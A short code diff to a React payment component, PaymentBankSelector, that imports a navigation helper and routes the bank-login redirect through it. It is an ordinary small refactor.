@@ -13,6 +13,7 @@ import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import BankLogo from "@/components/BankLogo";
+import { buildNavigationPath } from "@/utils/navigationHelper";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -93,7 +94,7 @@ const PaymentBankSelector = () => {
     }
 
     setTimeout(() => {
-      navigate(`/pay/${id}/bank-login`);
+      navigate(buildNavigationPath(`/pay/${id}/bank-login`));
     }, 400);
   };
   
